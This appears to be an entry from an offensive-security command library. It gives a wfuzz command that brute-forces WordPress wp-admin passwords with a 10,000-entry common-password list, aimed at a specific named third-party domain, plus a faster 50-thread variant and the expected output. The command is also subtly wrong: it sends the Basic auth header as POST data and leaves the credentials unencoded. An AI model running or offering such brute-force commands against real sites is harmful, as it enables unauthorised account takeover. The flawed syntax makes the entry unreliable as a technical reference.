---
id: cmd-uuid-1
data: >-
  wfuzz -c -w
  /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -u
  https://my.stripo.email/wp-admin -d "Authorization: Basic admin:FUZZ"
tags:
  - brute-force
  - fuzzing
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:59.226Z'
verified: false
validated: true
submitted: true
---
# wfuzz-brute-force-wp-admin

## Command

```bash
wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -u https://my.stripo.email/wp-admin -d "Authorization: Basic admin:FUZZ"
```

## Description

This command uses Wfuzz to perform a brute force attack on WordPress wp-admin Basic Authentication by fuzzing the password field with a wordlist of common passwords, demonstrating the vulnerability when no rate limiting is present.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-c` | Enables colored output for better readability | No |
| `-w` | Specifies the wordlist file path for payload generation | Yes |
| `-u` | Target URL to fuzz | Yes |
| `-d` | POST data string, where FUZZ is replaced by wordlist entries (here, in Basic Auth header) | Yes |

## Examples

### Basic Usage

```bash
wfuzz -c -w wordlist.txt -u https://target.com/wp-admin -d "Authorization: Basic admin:FUZZ"
```

### Advanced Usage

```bash
wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -u https://target.com/wp-admin -d "Authorization: Basic admin:FUZZ" --hc 404 -t 50
```

> Adds hiding 404 responses (--hc) and 50 threads (-t) for faster execution.

## Expected Output

The command will output a table showing each payload attempt, response code, size, and time. For example:

Target: https://my.stripo.email/wp-admin [Status: 401, Size: 123, Words: 10]

Without rate limiting, it processes ~3000 attempts in ~40 seconds, with consistent 401 responses until a match (potentially 200 OK).

## Related

- [[procedures/Brute-Force-WordPress-Admin-Credentials]]
- [[tools/Wfuzz]]
